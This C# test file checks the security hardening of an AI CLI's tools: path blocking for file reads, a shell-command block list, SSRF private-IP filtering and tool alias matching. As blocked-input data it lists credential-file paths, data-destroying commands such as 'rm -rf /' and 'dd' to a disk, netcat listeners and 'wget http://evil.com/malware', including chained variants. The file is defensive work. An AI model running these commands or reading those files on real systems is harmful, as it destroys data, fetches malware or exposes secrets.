using System.Net;
using System.Text.Json;
using AzureOpenAI_CLI.Tools;

namespace AzureOpenAI_CLI.Tests;

/// <summary>
/// Security-focused tests for the built-in tool system.
/// Validates that every hardening measure blocks what it should
/// and allows what it should.
/// </summary>
public class SecurityToolTests : IDisposable
{
    private readonly string _tempDir;

    public SecurityToolTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), $"sec-tests-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_tempDir);
    }

    public void Dispose()
    {
        try { Directory.Delete(_tempDir, recursive: true); } catch { /* best effort */ }
    }

    // ═══════════════════════════════════════════════════════════════════
    // 1. ReadFileTool — blocked path prefix checks
    // ═══════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("/etc/shadow")]
    [InlineData("/etc/passwd")]
    [InlineData("/etc/sudoers")]
    [InlineData("/etc/hosts")]
    [InlineData("/proc/self/environ")]
    [InlineData("/proc/self/cmdline")]
    public async Task ReadFile_ExactBlockedPaths_ReturnsError(string blockedPath)
    {
        var tool = new ReadFileTool();
        var json = $$"""{"path":"{{blockedPath}}"}""";
        var args = JsonDocument.Parse(json).RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.StartsWith("Error:", result);
        Assert.Contains("blocked", result);
    }

    [Theory]
    [InlineData("/root/.ssh/id_rsa")]
    [InlineData("/root/.ssh/authorized_keys")]
    [InlineData("/root/.ssh/config")]
    public async Task ReadFile_SubPathUnderBlockedPrefix_ReturnsError(string subPath)
    {
        var tool = new ReadFileTool();
        var json = $$"""{"path":"{{subPath}}"}""";
        var args = JsonDocument.Parse(json).RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.StartsWith("Error:", result);
        Assert.Contains("blocked", result);
    }

    [Fact]
    public void IsBlockedPath_ExactMatch_ReturnsTrue()
    {
        Assert.True(ReadFileTool.IsBlockedPath("/etc/shadow"));
    }

    [Fact]
    public void IsBlockedPath_PrefixMatch_ReturnsTrue()
    {
        Assert.True(ReadFileTool.IsBlockedPath("/root/.ssh/id_rsa"));
    }

    [Fact]
    public void IsBlockedPath_PrefixMatch_DeepNested_ReturnsTrue()
    {
        Assert.True(ReadFileTool.IsBlockedPath("/root/.ssh/keys/backup/id_rsa"));
    }

    [Fact]
    public void IsBlockedPath_UnrelatedPath_ReturnsFalse()
    {
        Assert.False(ReadFileTool.IsBlockedPath("/home/user/document.txt"));
    }

    [Fact]
    public void IsBlockedPath_SimilarButNotBlocked_ReturnsFalse()
    {
        // "/etc/shadow" is blocked but "/etc/shadow_backup_dir" should NOT be blocked
        // because it's not "/etc/shadow" exactly and not "/etc/shadow/..." prefix
        Assert.False(ReadFileTool.IsBlockedPath("/etc/shadowbackup"));
    }

    [Fact]
    public async Task ReadFile_SymlinkToBlockedPath_ReturnsError()
    {
        // Create a symlink pointing to /etc/shadow
        var symlinkPath = Path.Combine(_tempDir, "sneaky-link");
        try
        {
            File.CreateSymbolicLink(symlinkPath, "/etc/shadow");
        }
        catch (IOException)
        {
            // If symlink creation fails (permission), skip test
            return;
        }

        var tool = new ReadFileTool();
        var json = $$"""{"path":"{{symlinkPath.Replace("\\", "\\\\")}}" }""";
        var args = JsonDocument.Parse(json).RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.StartsWith("Error:", result);
        Assert.Contains("blocked", result.ToLower());
    }

    [Fact]
    public async Task ReadFile_SymlinkToSshDir_ReturnsError()
    {
        // Create a symlink pointing to /root/.ssh/id_rsa
        var symlinkPath = Path.Combine(_tempDir, "ssh-link");
        try
        {
            File.CreateSymbolicLink(symlinkPath, "/root/.ssh/id_rsa");
        }
        catch (IOException)
        {
            return; // skip if symlink creation not permitted
        }

        var tool = new ReadFileTool();
        var json = $$"""{"path":"{{symlinkPath.Replace("\\", "\\\\")}}" }""";
        var args = JsonDocument.Parse(json).RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        // Should get either "not found" (if target doesn't exist) or "blocked" (if resolved)
        Assert.StartsWith("Error:", result);
    }

    [Fact]
    public async Task ReadFile_NormalFile_Succeeds()
    {
        var filePath = Path.Combine(_tempDir, "safe.txt");
        File.WriteAllText(filePath, "safe content");

        var tool = new ReadFileTool();
        var json = $$"""{"path":"{{filePath.Replace("\\", "\\\\")}}" }""";
        var args = JsonDocument.Parse(json).RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.Equal("safe content", result);
    }

    [Fact]
    public async Task ReadFile_SymlinkToSafeFile_Succeeds()
    {
        // Create a safe file and a symlink to it — should be allowed
        var realFile = Path.Combine(_tempDir, "real.txt");
        File.WriteAllText(realFile, "linked content");
        var symlinkPath = Path.Combine(_tempDir, "good-link");
        try
        {
            File.CreateSymbolicLink(symlinkPath, realFile);
        }
        catch (IOException)
        {
            return; // skip if symlink creation not permitted
        }

        var tool = new ReadFileTool();
        var json = $$"""{"path":"{{symlinkPath.Replace("\\", "\\\\")}}" }""";
        var args = JsonDocument.Parse(json).RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.Equal("linked content", result);
    }

    // ═══════════════════════════════════════════════════════════════════
    // 2. ShellExecTool — newly blocked commands
    // ═══════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("sudo apt install foo")]
    [InlineData("su -")]
    [InlineData("crontab -l")]
    [InlineData("vi /etc/hosts")]
    [InlineData("vim file.txt")]
    [InlineData("nano config.yml")]
    [InlineData("nc -l 8080")]
    [InlineData("ncat 127.0.0.1 80")]
    [InlineData("netcat -z host 80")]
    [InlineData("wget http://evil.com/malware")]
    public async Task ShellExec_NewlyBlockedCommands_ReturnsError(string cmd)
    {
        var tool = new ShellExecTool();
        var json = $$"""{"command":"{{cmd}}"}""";
        var args = JsonDocument.Parse(json).RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.StartsWith("Error:", result);
        Assert.Contains("blocked", result);
    }

    [Theory]
    [InlineData("rm -rf /")]
    [InlineData("rmdir /tmp/test")]
    [InlineData("kill 1234")]
    [InlineData("killall nginx")]
    [InlineData("pkill node")]
    [InlineData("shutdown -h now")]
    [InlineData("reboot")]
    [InlineData("dd if=/dev/zero of=/dev/sda")]
    [InlineData("passwd")]
    public async Task ShellExec_OriginalBlockedCommands_StillBlocked(string cmd)
    {
        var tool = new ShellExecTool();
        var json = $$"""{"command":"{{cmd}}"}""";
        var args = JsonDocument.Parse(json).RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.StartsWith("Error:", result);
        Assert.Contains("blocked", result);
    }

    [Theory]
    [InlineData("echo hello | sudo tee /etc/hosts")]
    [InlineData("ls; wget http://evil.com")]
    [InlineData("echo test & nc -l 80")]
    public async Task ShellExec_PipedNewBlockedCommands_ReturnsError(string cmd)
    {
        var tool = new ShellExecTool();
        var json = $$"""{"command":"{{cmd}}"}""";
        var args = JsonDocument.Parse(json).RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.StartsWith("Error:", result);
        Assert.Contains("blocked", result);
    }

    [Theory]
    [InlineData("echo hello")]
    [InlineData("ls -la")]
    [InlineData("cat /dev/null")]
    [InlineData("grep foo bar")]
    [InlineData("curl --version")]
    [InlineData("git status")]
    public async Task ShellExec_SafeCommands_Succeed(string cmd)
    {
        var tool = new ShellExecTool();
        var json = $$"""{"command":"{{cmd}}"}""";
        var args = JsonDocument.Parse(json).RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.DoesNotContain("blocked", result);
    }

    [Fact]
    public async Task ShellExec_CurlExplicitlyAllowed()
    {
        // curl is specifically NOT blocked — model needs it
        var tool = new ShellExecTool();
        var args = JsonDocument.Parse("""{"command":"curl --version"}""").RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.DoesNotContain("blocked", result);
        Assert.Contains("curl", result); // curl --version prints curl info
    }

    [Fact]
    public async Task ShellExec_StdinClosed_NonInteractiveCommandCompletes()
    {
        // This test validates that stdin is closed — a simple echo should
        // still work and return quickly even though stdin is closed
        var tool = new ShellExecTool();
        var args = JsonDocument.Parse("""{"command":"echo stdin-test"}""").RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.Contains("stdin-test", result);
    }

    // ═══════════════════════════════════════════════════════════════════
    // 3. WebFetchTool — private IP / SSRF blocking
    // ═══════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("127.0.0.1", true)]        // IPv4 loopback
    [InlineData("127.0.0.2", true)]        // IPv4 loopback range
    [InlineData("10.0.0.1", true)]         // 10.0.0.0/8
    [InlineData("10.255.255.255", true)]   // 10.0.0.0/8 end
    [InlineData("172.16.0.1", true)]       // 172.16.0.0/12 start
    [InlineData("172.31.255.255", true)]   // 172.16.0.0/12 end
    [InlineData("192.168.0.1", true)]      // 192.168.0.0/16
    [InlineData("192.168.255.255", true)]  // 192.168.0.0/16 end
    [InlineData("169.254.1.1", true)]      // Link-local
    [InlineData("8.8.8.8", false)]         // Google DNS — public
    [InlineData("1.1.1.1", false)]         // Cloudflare — public
    [InlineData("172.15.255.255", false)]  // Just below 172.16 range
    [InlineData("172.32.0.0", false)]      // Just above 172.31 range
    [InlineData("192.169.0.1", false)]     // Not 192.168
    public void IsPrivateAddress_IPv4_CorrectResult(string ip, bool expected)
    {
        var address = IPAddress.Parse(ip);
        Assert.Equal(expected, WebFetchTool.IsPrivateAddress(address));
    }

    [Fact]
    public void IsPrivateAddress_IPv6Loopback_ReturnsTrue()
    {
        Assert.True(WebFetchTool.IsPrivateAddress(IPAddress.IPv6Loopback)); // ::1
    }

    [Fact]
    public void IsPrivateAddress_UniqueLocal_ReturnsTrue()
    {
        // fd00::1 — unique local address
        var address = IPAddress.Parse("fd00::1");
        Assert.True(WebFetchTool.IsPrivateAddress(address));
    }

    [Fact]
    public void IsPrivateAddress_LinkLocalIPv6_ReturnsTrue()
    {
        var address = IPAddress.Parse("fe80::1");
        Assert.True(WebFetchTool.IsPrivateAddress(address));
    }

    [Fact]
    public void IsPrivateAddress_PublicIPv6_ReturnsFalse()
    {
        // 2001:4860:4860::8888 — Google public DNS
        var address = IPAddress.Parse("2001:4860:4860::8888");
        Assert.False(WebFetchTool.IsPrivateAddress(address));
    }

    [Fact]
    public void IsPrivateAddress_IPv4MappedIPv6Loopback_ReturnsTrue()
    {
        // ::ffff:127.0.0.1 — IPv4-mapped IPv6 loopback
        var address = IPAddress.Parse("::ffff:127.0.0.1");
        Assert.True(WebFetchTool.IsPrivateAddress(address));
    }

    [Fact]
    public void IsPrivateAddress_IPv4MappedIPv6Private_ReturnsTrue()
    {
        // ::ffff:10.0.0.1 — IPv4-mapped IPv6 private
        var address = IPAddress.Parse("::ffff:10.0.0.1");
        Assert.True(WebFetchTool.IsPrivateAddress(address));
    }

    [Fact]
    public void IsPrivateAddress_IPv4MappedIPv6Public_ReturnsFalse()
    {
        var address = IPAddress.Parse("::ffff:8.8.8.8");
        Assert.False(WebFetchTool.IsPrivateAddress(address));
    }

    [Fact]
    public async Task WebFetch_HttpUrl_ReturnsError()
    {
        var tool = new WebFetchTool();
        var args = JsonDocument.Parse("""{"url":"http://example.com"}""").RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.Contains("HTTPS", result);
    }

    [Fact]
    public async Task WebFetch_LocalhostUrl_ReturnsPrivateBlockError()
    {
        var tool = new WebFetchTool();
        var args = JsonDocument.Parse("""{"url":"https://localhost/secret"}""").RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.StartsWith("Error:", result);
        Assert.Contains("private", result.ToLower());
    }

    [Fact]
    public async Task WebFetch_127001Url_ReturnsPrivateBlockError()
    {
        var tool = new WebFetchTool();
        var args = JsonDocument.Parse("""{"url":"https://127.0.0.1/admin"}""").RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.StartsWith("Error:", result);
        Assert.Contains("private", result.ToLower());
    }

    [Fact]
    public async Task WebFetch_InvalidUrl_ReturnsError()
    {
        var tool = new WebFetchTool();
        var args = JsonDocument.Parse("""{"url":"not-a-url"}""").RootElement;

        var result = await tool.ExecuteAsync(args, CancellationToken.None);

        Assert.Contains("HTTPS", result);
    }

    // ═══════════════════════════════════════════════════════════════════
    // 4. ToolRegistry — alias-based matching instead of Contains
    // ═══════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("shell", "shell_exec")]
    [InlineData("file", "read_file")]
    [InlineData("web", "web_fetch")]
    [InlineData("clipboard", "get_clipboard")]
    [InlineData("datetime", "get_datetime")]
    public void Create_WithShortAlias_ReturnsCorrectSingleTool(string alias, string expectedName)
    {
        var registry = ToolRegistry.Create([alias]);

        Assert.Single(registry.All);
        Assert.Equal(expectedName, registry.All.First().Name);
    }

    [Fact]
    public void Create_WithFullName_ReturnsCorrectTool()
    {
        var registry = ToolRegistry.Create(["shell_exec"]);

        Assert.Single(registry.All);
        Assert.Equal("shell_exec", registry.All.First().Name);
    }

    [Fact]
    public void Create_WithAmbiguousSubstring_DoesNotMatchAll()
    {
        // "s" used to match everything containing 's' — now it should match nothing
        var registry = ToolRegistry.Create(["s"]);

        Assert.Empty(registry.All);
    }

    [Fact]
    public void Create_WithPartialNonAlias_DoesNotMatch()
    {
        // "get" is not an alias — should not match get_clipboard or get_datetime
        var registry = ToolRegistry.Create(["get"]);

        Assert.Empty(registry.All);
    }

    [Fact]
    public void Create_WithExec_DoesNotMatch()
    {
        // "exec" is not an alias — should not match shell_exec
        var registry = ToolRegistry.Create(["exec"]);

        Assert.Empty(registry.All);
    }

    [Fact]
    public void Create_WithMultipleAliases_ReturnsMultipleTools()
    {
        var registry = ToolRegistry.Create(["shell", "web"]);

        Assert.Equal(2, registry.All.Count);
        Assert.Contains(registry.All, t => t.Name == "shell_exec");
        Assert.Contains(registry.All, t => t.Name == "web_fetch");
    }

    [Fact]
    public void Create_MixingAliasAndFullName_Works()
    {
        var registry = ToolRegistry.Create(["shell", "get_datetime"]);

        Assert.Equal(2, registry.All.Count);
        Assert.Contains(registry.All, t => t.Name == "shell_exec");
        Assert.Contains(registry.All, t => t.Name == "get_datetime");
    }

    [Fact]
    public void Create_WithNull_ReturnsAllTools()
    {
        var registry = ToolRegistry.Create(null);

        Assert.Equal(6, registry.All.Count);
    }

    [Fact]
    public void Create_WithNonexistentAlias_ReturnsEmpty()
    {
        var registry = ToolRegistry.Create(["bogus"]);

        Assert.Empty(registry.All);
    }

    [Fact]
    public void Create_CaseInsensitiveAlias_Works()
    {
        var registry = ToolRegistry.Create(["SHELL"]);

        Assert.Single(registry.All);
        Assert.Equal("shell_exec", registry.All.First().Name);
    }

    // ═══════════════════════════════════════════════════════════════════
    // 5. ReadFileTool — prefix blocks are not overly broad
    // ═══════════════════════════════════════════════════════════════════

    [Fact]
    public void IsBlockedPath_ProcSelfEnviron_Blocked()
    {
        Assert.True(ReadFileTool.IsBlockedPath("/proc/self/environ"));
    }

    [Fact]
    public void IsBlockedPath_ProcSelfCmdline_Blocked()
    {
        Assert.True(ReadFileTool.IsBlockedPath("/proc/self/cmdline"));
    }

    [Fact]
    public void IsBlockedPath_EtcHosts_Blocked()
    {
        Assert.True(ReadFileTool.IsBlockedPath("/etc/hosts"));
    }

    [Fact]
    public void IsBlockedPath_RootSsh_Blocked()
    {
        Assert.True(ReadFileTool.IsBlockedPath("/root/.ssh"));
    }

    [Fact]
    public void IsBlockedPath_HomeSshNotBlocked()
    {
        // /home/user/.ssh is NOT in the blocked list — only /root/.ssh is blocked
        Assert.False(ReadFileTool.IsBlockedPath("/home/user/.ssh"));
    }

    [Fact]
    public void IsBlockedPath_EtcSomethingElse_NotBlocked()
    {
        // /etc/nginx/nginx.conf is not blocked
        Assert.False(ReadFileTool.IsBlockedPath("/etc/nginx/nginx.conf"));
    }
}
